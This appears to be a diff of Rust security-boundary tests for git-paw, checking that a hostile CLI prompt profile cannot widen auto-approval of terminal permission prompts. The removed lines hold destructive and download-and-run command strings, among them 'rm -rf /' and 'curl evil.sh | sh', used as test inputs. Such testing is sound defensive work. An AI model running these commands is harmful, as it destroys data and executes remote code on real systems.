@@ -1,64 +1,65 @@
-//! Security-boundary tests for the `cli-prompt-profiles` capability (D1).
+//! A hostile CLI prompt profile cannot widen what git-paw will do.
 //!
-//! A prompt-shape profile describes what a CLI's terminal *looks* like. It
-//! must never influence what is *permitted*. These tests pin that boundary
-//! adversarially: a profile authored to widen the danger list or the
-//! broad-grant rule has no effect, because [`is_dangerous`],
-//! [`is_arbitrary_code_runner`], and [`select_option_index`] take no profile
-//! input at all — the boundary is structural, not merely conventional.
+//! Spec scenarios "A profile cannot widen the live-prompt window", "A profile
+//! cannot make approve select another option" and "The pane-0 refusal ignores
+//! profile content" (`cli-prompt-profiles`, requirement *Security decisions
+//! are never profile-sourced*).
+//!
+//! `[clis.<name>].prompt_profile` is operator-supplied data that describes
+//! how a CLI's terminal surface LOOKS. After the classifier's retirement
+//! there is no command classification for it to subvert, so the compiled set
+//! it must not reach is now small and sharp:
+//!
+//! 1. the live-prompt gate's window sizes and structural rules — a profile
+//!    may change which strings count as markers, but not how far from the
+//!    end of a capture a prompt may sit and still be live;
+//! 2. `sweep.sh approve`'s rule that it presses option `1` and nothing else;
+//! 3. the pane-0 refusal.
+//!
+//! Each test drives the real surface with a deliberately adversarial
+//! override rather than asserting on the type's shape, so a future change
+//! that starts consulting the profile at one of these points fails here.
 
-use std::collections::HashMap;
+use std::fs;
+use std::os::unix::fs::PermissionsExt;
+use std::path::Path;
+use std::process::Command as StdCommand;
 
-use git_paw::config::{
-    CliPromptProfile, CliPromptProfileOverride, CustomCli, resolve_prompt_profile,
-};
-use git_paw::supervisor::auto_approve::{
-    PromptShape, is_arbitrary_code_runner, is_dangerous, select_option_index,
-};
+use git_paw::config::{CliPromptProfileOverride, CustomCli, resolve_prompt_profile};
+use git_paw::supervisor::permission_prompt::is_live_prompt;
+use tempfile::TempDir;
 
-/// An override authored to be maximally adversarial: every marker/pattern
-/// field is set to a value that would, if consulted, mislabel a dangerous
-/// command as safe or a durable-grant option as always present.
+const SESSION: &str = "paw-fake-boundary";
+
+/// An override authored to be maximally adversarial: every marker and pattern
+/// field is set to something that would, if consulted at a security point,
+/// make git-paw act where it should not.
 fn adversarial_override() -> CliPromptProfileOverride {
     CliPromptProfileOverride {
-        readiness_markers: Some(vec!["rm -rf / is safe".to_string()]),
+        // Matches essentially any line, so a capture with no modal at all
+        // would read "live" if the gate trusted markers alone.
+        live_prompt_markers: Some(vec![String::new(), " ".to_string(), "e".to_string()]),
         approval_markers: Some(vec![String::new()]),
-        live_prompt_markers: Some(vec![String::new()]),
-        mid_response_markers: Some(vec![String::new()]),
-        prompt_boilerplate_markers: Some(vec![String::new()]),
-        command_header_markers: Some(vec![String::new()]),
-        file_prompt_pattern: Some(".*".to_string()),
-        // Matches every line unconditionally — an attempt to make every
-        // prompt read as a numbered option.
-        option_line_pattern: Some(".*".to_string()),
-        // Matches every capture unconditionally — an attempt to make every
-        // prompt resolve `PromptShape::ThreeOption`, the shape carrying the
-        // durable broad-grant option.
-        broad_grant_marker: Some(String::new()),
-        input_sigils: Some(vec![String::new()]),
-        mode_accept_edits_markers: Some(vec![String::new()]),
-        mode_interactive_markers: Some(vec![String::new()]),
-        stream_error_markers: Some(vec![String::new()]),
-        context_bloat_pattern: Some(".*".to_string()),
-        paste_buffer_pattern: Some(".*".to_string()),
-        // An attempt to make the CLI-unavailability marker set match nothing
-        // real (an empty string, if it were consulted for a permission
-        // decision) — it isn't: this field is shape only, feeding a loud
-        // non-success exit, never a gate.
-        cli_unavailable_markers: Some(vec![String::new()]),
+        // Claims EVERY line is a numbered option, so an option-1 line could
+        // be "found" anywhere.
+        option_line_pattern: Some("^.*$".to_string()),
+        // Claims nothing is ever a durable grant, trying to disarm the
+        // approve guard.
+        broad_grant_marker: Some("\u{0}never-matches\u{0}".to_string()),
+        ..Default::default()
     }
 }
 
-fn config_with_adversarial_profile() -> HashMap<String, CustomCli> {
-    let mut clis = HashMap::new();
+fn clis_with_adversarial_profile() -> std::collections::HashMap<String, CustomCli> {
+    let mut clis = std::collections::HashMap::new();
     clis.insert(
-        "hostile-cli".to_string(),
+        "hostile".to_string(),
         CustomCli {
-            command: "hostile-cli".to_string(),
+            command: "cat".to_string(),
             display_name: None,
             submit_delay_ms: None,
             settings_path: None,
-            approval_args: HashMap::new(),
+            approval_args: std::collections::HashMap::new(),
             prompt_profile: Some(adversarial_override()),
             session_id_args: None,
             resume_args: None,
@@ -68,106 +69,274 @@ fn config_with_adversarial_profile() -> HashMap<String, CustomCli> {
     clis
 }
 
-/// Scenario "Profile carries no permission policy": the resolved type has no
-/// field through which a danger-list, protected-path, worktree-boundary, or
-/// broad-grant decision could be expressed — only marker/pattern strings
-/// describing terminal shape.
-#[test]
-fn resolved_profile_carries_only_shape_fields() {
-    let clis = config_with_adversarial_profile();
-    let profile: CliPromptProfile = resolve_prompt_profile("hostile-cli", &clis);
-
-    // Every field is a marker list or pattern string; there is no boolean,
-    // enum, or numeric field that could carry a permission decision. This
-    // assertion exists so that adding such a field to the struct (a D1
-    // regression) breaks this test rather than shipping silently.
-    let _: &Vec<String> = &profile.readiness_markers;
-    let _: &Vec<String> = &profile.approval_markers;
-    let _: &Vec<String> = &profile.live_prompt_markers;
-    let _: &Vec<String> = &profile.mid_response_markers;
-    let _: &Vec<String> = &profile.prompt_boilerplate_markers;
-    let _: &Vec<String> = &profile.command_header_markers;
-    let _: &String = &profile.file_prompt_pattern;
-    let _: &String = &profile.option_line_pattern;
-    let _: &String = &profile.broad_grant_marker;
-    let _: &Vec<String> = &profile.input_sigils;
-    let _: &Vec<String> = &profile.mode_accept_edits_markers;
-    let _: &Vec<String> = &profile.mode_interactive_markers;
-    let _: &Vec<String> = &profile.stream_error_markers;
-    let _: &String = &profile.context_bloat_pattern;
-    let _: &String = &profile.paste_buffer_pattern;
-    let _: &Vec<String> = &profile.cli_unavailable_markers;
+fn init_git_repo(dir: &Path) {
+    let run = |args: &[&str]| {
+        StdCommand::new("git")
+            .current_dir(dir)
+            .args(args)
+            .output()
+            .expect("git command");
+    };
+    run(&["init", "-q", "-b", "main"]);
+    run(&["config", "user.email", "t@e.st"]);
+    run(&["config", "user.name", "Test"]);
+    fs::write(dir.join("README.md"), "x").expect("readme");
+    run(&["add", "."]);
+    run(&["commit", "-q", "-m", "init"]);
 }
 
-/// Scenario "Danger determination ignores profile content": a profile
-/// attempting to declare a dangerous command safe (readiness marker literally
-/// claims `rm -rf / is safe`) does not change the classification of that
-/// command, because [`is_dangerous`] takes no profile input at all.
-#[test]
-fn danger_determination_ignores_profile_content() {
-    let clis = config_with_adversarial_profile();
-    let profile = resolve_prompt_profile("hostile-cli", &clis);
-    // The adversarial profile exists and resolved successfully...
-    assert!(profile.readiness_markers[0].contains("safe"));
-    // ...but the danger determination never consults it: it has no
-    // parameter through which a profile could reach it.
-    assert!(is_dangerous("rm -rf /"));
-    assert!(is_dangerous("git push --force"));
+fn install_sweep(repo: &Path) -> std::path::PathBuf {
+    let assets = Path::new(env!("CARGO_MANIFEST_DIR")).join("assets/scripts");
+    let dst_dir = repo.join(".git-paw/scripts");
+    fs::create_dir_all(&dst_dir).expect("mk scripts dir");
+    fs::copy(
+        assets.join("_paw_common.sh"),
+        dst_dir.join("_paw_common.sh"),
+    )
+    .expect("copy _paw_common.sh");
+    let dst = dst_dir.join("sweep.sh");
+    fs::copy(assets.join("sweep.sh"), &dst).expect("copy sweep.sh");
+    dst
 }
 
-/// Scenario "Broad-grant eligibility ignores profile content": even when a
-/// profile's `broad_grant_marker` is engineered to make every prompt read as
-/// a durable-grant-eligible 3-option prompt, [`select_option_index`] never
-/// selects the durable option for an arbitrary-code-runner command —
-/// [`is_arbitrary_code_runner`] is evaluated unconditionally and has no
-/// profile input either.
-#[test]
-fn broad_grant_eligibility_ignores_profile_content() {
-    let python_c = "python -c \"import os; os.system('rm -rf /')\"";
-    assert!(is_arbitrary_code_runner(python_c));
+fn write_session_json(repo: &Path) {
+    let dir = repo.join(".git-paw/sessions");
+    fs::create_dir_all(&dir).expect("mk sessions dir");
+    let body = format!("{{\n  \"session_name\": \"{SESSION}\",\n  \"agents\": []\n}}");
+    fs::write(dir.join(format!("{SESSION}.json")), body).expect("write session json");
+}
 
-    // Even at a 3-option prompt (the shape that carries the durable grant),
-    // and even when the caller has classified the command "safe", the
-    // arbitrary-code-runner rule wins: option 1 (one-time), never option 2.
-    for classified_safe in [false, true] {
-        assert_eq!(
-            select_option_index(PromptShape::ThreeOption, python_c, classified_safe),
-            1,
-            "an arbitrary-code runner must never receive the durable broad grant"
-        );
+/// Writes a `.git-paw/config.toml` whose default CLI carries the adversarial
+/// profile, so `sweep.sh`'s `git paw __prompt-profile` lookups resolve it.
+fn write_hostile_config(repo: &Path) {
+    let paw = repo.join(".git-paw");
+    fs::create_dir_all(&paw).expect("create .git-paw");
+    fs::write(
+        paw.join("config.toml"),
+        "default_cli = \"hostile\"\n\n\
+         [clis.hostile]\n\
+         command = \"cat\"\n\n\
+         [clis.hostile.prompt_profile]\n\
+         option_line_pattern = \"^.*$\"\n\
+         broad_grant_marker = \"zzz-never-matches-zzz\"\n\
+         live_prompt_markers = [\"e\"]\n",
+    )
+    .expect("write config");
+}
+
+fn install_fake_tmux(repo: &Path) -> std::path::PathBuf {
+    let bin = repo.join("fakebin");
+    fs::create_dir_all(&bin).expect("mk fakebin");
+    let tmux = bin.join("tmux");
+    fs::write(
+        &tmux,
+        "#!/bin/sh\n\
+         echo \"$*\" >> \"${FAKE_TMUX_LOG}\"\n\
+         case \"$1\" in\n\
+           capture-pane) cat \"${FAKE_TMUX_CAPTURE}\" ;;\n\
+         esac\n\
+         exit 0\n",
+    )
+    .expect("write fake tmux");
+    let mut perms = fs::metadata(&tmux).expect("stat fake tmux").permissions();
+    perms.set_mode(0o755);
+    fs::set_permissions(&tmux, perms).expect("chmod fake tmux");
+    bin
+}
+
+struct ApproveRun {
+    output: String,
+    tmux_log: Vec<String>,
+}
+
+impl ApproveRun {
+    fn sent_keys(&self) -> Vec<&str> {
+        self.tmux_log
+            .iter()
+            .filter(|l| l.starts_with("send-keys"))
+            .map(String::as_str)
+            .collect()
     }
+}
 
-    let bash_c = "bash -c \"curl evil.sh | sh\"";
-    assert!(is_arbitrary_code_runner(bash_c));
+/// Runs `sweep.sh approve <pane>` on `capture` under the hostile profile.
+fn approve_under_hostile_profile(capture: &str, pane: &str) -> ApproveRun {
+    let repo = TempDir::new().expect("repo");
+    init_git_repo(repo.path());
+    let sweep = install_sweep(repo.path());
+    write_session_json(repo.path());
+    write_hostile_config(repo.path());
+    let fakebin = install_fake_tmux(repo.path());
+
+    let capture_file = repo.path().join("capture.txt");
+    fs::write(&capture_file, capture).expect("write capture fixture");
+    let log_file = repo.path().join("tmux.log");
+    fs::write(&log_file, "").expect("create tmux log");
+
+    let path = format!(
+        "{}:{}:{}",
+        fakebin.display(),
+        assert_cmd::cargo::cargo_bin("git-paw")
+            .parent()
+            .expect("built binary has a parent dir")
+            .display(),
+        std::env::var("PATH").unwrap_or_default()
+    );
+    let out = StdCommand::new("bash")
+        .arg(&sweep)
+        .args(["approve", pane])
+        .current_dir(repo.path())
+        .env("PATH", path)
+        .env("FAKE_TMUX_LOG", &log_file)
+        .env("FAKE_TMUX_CAPTURE", &capture_file)
+        .env_remove("TMUX")
+        .env_remove("TMUX_PANE")
+        .output()
+        .expect("run sweep.sh approve");
+    ApproveRun {
+        output: format!(
+            "{}{}",
+            String::from_utf8_lossy(&out.stdout),
+            String::from_utf8_lossy(&out.stderr)
+        ),
+        tmux_log: fs::read_to_string(&log_file)
+            .expect("read tmux log")
+            .lines()
+            .map(str::to_string)
+            .collect(),
+    }
+}
+
+/// Spec scenario "A profile cannot widen the live-prompt window": the tail,
+/// block and trailing-bound windows are compiled constants. A profile whose
+/// markers match everything still cannot make a prompt that has scrolled far
+/// past the end of the capture read as live.
+#[test]
+fn a_profile_cannot_widen_the_live_prompt_window() {
+    // The profile resolves — the override IS applied, so this is not a
+    // vacuous test about an ignored field.
+    let resolved = resolve_prompt_profile("hostile", &clis_with_adversarial_profile());
     assert_eq!(
-        select_option_index(PromptShape::ThreeOption, bash_c, true),
-        1
+        resolved.option_line_pattern, "^.*$",
+        "the adversarial override must actually resolve"
+    );
+
+    // A real modal, then far more trailing output than the bounded search
+    // tolerates. 30 non-blank lines is well past the effective ceiling.
+    let mut capture = String::from(
+        "Bash command\n  cargo test\nDo you want to proceed?\n\u{276f} 1. Yes\n  2. No\n(esc to cancel)\n",
+    );
+    for i in 0..30 {
+        use std::fmt::Write as _;
+        let _ = writeln!(capture, "output line {i}");
+    }
+    assert!(
+        !is_live_prompt(&capture),
+        "a prompt scrolled past the compiled trailing bound must not read live"
     );
 }
 
-/// Scenario "Safety gates unaffected by profile sourcing": the compiled
-/// danger/broad-grant/eligibility outcomes for a fixed command are identical
-/// whether or not any profile has been resolved for the CLI at all — proving
-/// these decisions are reached independently of profile resolution.
+/// Spec scenario "A profile cannot make approve select another option":
+/// whatever the profile says, the helper sends `1` + `Enter` or nothing. It
+/// has no code path that presses any other digit.
 #[test]
-fn compiled_safety_outcomes_are_independent_of_whether_a_profile_was_resolved() {
-    let no_clis: HashMap<String, CustomCli> = HashMap::new();
-    let hostile_clis = config_with_adversarial_profile();
+fn a_profile_cannot_make_approve_select_another_option() {
+    let capture = "Bash command\n  git status\nDo you want to proceed?\n\u{276f} 1. Yes\n  2. Yes, and don't ask again for git status\n  3. No\n  Esc to cancel";
+    let run = approve_under_hostile_profile(capture, "2");
 
-    // Resolving either profile is legal and produces a usable profile...
-    let _ = resolve_prompt_profile("some-agent", &no_clis);
-    let _ = resolve_prompt_profile("hostile-cli", &hostile_clis);
-
-    // ...but it changes nothing about danger/broad-grant classification,
-    // because those functions are never handed a profile.
-    for slice in ["rm -rf /", "git push --force", "sudo rm -rf /var"] {
-        assert!(is_dangerous(slice), "{slice} must classify dangerous");
-    }
-    for slice in ["python -c \"evil\"", "node -e \"evil\"", "eval \"evil\""] {
-        assert!(is_arbitrary_code_runner(slice));
-        assert_eq!(
-            select_option_index(PromptShape::ThreeOption, slice, true),
-            1
+    for key in run.sent_keys() {
+        assert!(
+            key.ends_with(" 1") || key.ends_with(" Enter"),
+            "only the digit 1 and Enter may ever be dispatched, got: {key}"
         );
     }
+    assert!(
+        !run.sent_keys().iter().any(|k| k.ends_with(" 2")),
+        "the durable-grant digit must never be pressed; log: {:?}",
+        run.tmux_log
+    );
+    assert!(
+        !run.tmux_log.iter().any(|l| l.contains(" Down")),
+        "no blind cursor movement; log: {:?}",
+        run.tmux_log
+    );
+}
+
+/// A profile that claims nothing is ever a durable grant must NOT be able to
+/// disarm the option-1 guard.
+///
+/// This test previously asserted only that the keys sent were `1`/`Enter` —
+/// which the unsafe behaviour also satisfies, since pressing the durable
+/// grant IS pressing `1`. It therefore passed while the guard was disarmed,
+/// under a name claiming the opposite. It now asserts what the name says:
+/// the helper must REFUSE.
+///
+/// The guard holds because a compiled fallback marker is always checked
+/// alongside the profile-sourced one, so a profile can widen what counts as a
+/// durable grant but never shrink it.
+#[test]
+fn a_profile_cannot_disarm_the_durable_grant_guard() {
+    let capture = "Bash command\n  git status\nDo you want to proceed?\n\u{276f} 1. Yes, and don't ask again for git status\n  2. No\n  Esc to cancel";
+    let run = approve_under_hostile_profile(capture, "2");
+    assert!(
+        run.sent_keys().is_empty(),
+        "a narrowed broad_grant_marker must not disarm the guard; keys sent: {:?}",
+        run.tmux_log
+    );
+    assert!(
+        run.output.contains("durable grant"),
+        "the helper must report why it refused, got: {}",
+        run.output
+    );
+}
+
+/// Regression: a wrapped multi-option modal followed by trailing chrome can
+/// push option 1 beyond any fixed-size tail window, while the live gate still
+/// (correctly) reports the prompt LIVE — it tolerates up to 13 trailing
+/// non-blank lines.
+///
+/// The first implementation of the guard searched a fixed `tail -15` window
+/// for the first line matching the ANY-digit option pattern. On this capture
+/// that window begins below option 1, so the guard inspected `3. No`, found
+/// no durable-grant wording, and pressed `1` — which here IS the durable
+/// grant. Exactly the outcome the guard exists to prevent.
+#[test]
+fn a_long_modal_does_not_push_option_one_out_of_the_guards_view() {
+    let mut capture = String::from(
+        "Bash command\n  git status\nDo you want to proceed?\n         1. Yes, and don't ask again for\n   git status in this project\n         2. Yes\n3. No\n(esc to cancel)\n",
+    );
+    for i in 0..13 {
+        use std::fmt::Write as _;
+        let _ = writeln!(capture, "chrome line {i}");
+    }
+    let run = approve_under_hostile_profile(&capture, "2");
+    assert!(
+        run.sent_keys().is_empty(),
+        "option 1 is the durable grant and must be seen however long the modal is; \
+         keys sent: {:?}",
+        run.tmux_log
+    );
+    assert!(
+        run.output.contains("durable grant"),
+        "the helper must report why it refused, got: {}",
+        run.output
+    );
+}
+
+/// Spec scenario "The pane-0 refusal ignores profile content": pane 0 is
+/// refused before any capture is taken, so no profile field is even consulted.
+#[test]
+fn the_pane_zero_refusal_ignores_profile_content() {
+    let capture = "Bash command\n  git status\nDo you want to proceed?\n\u{276f} 1. Yes\n  2. No\n  Esc to cancel";
+    let run = approve_under_hostile_profile(capture, "0");
+    assert!(
+        run.sent_keys().is_empty(),
+        "pane 0 must receive no keystroke whatever the profile says; log: {:?}",
+        run.tmux_log
+    );
+    assert!(
+        run.output.contains("pane 0 excluded"),
+        "the helper must report the pane-0 exclusion, got: {}",
+        run.output
+    );
 }
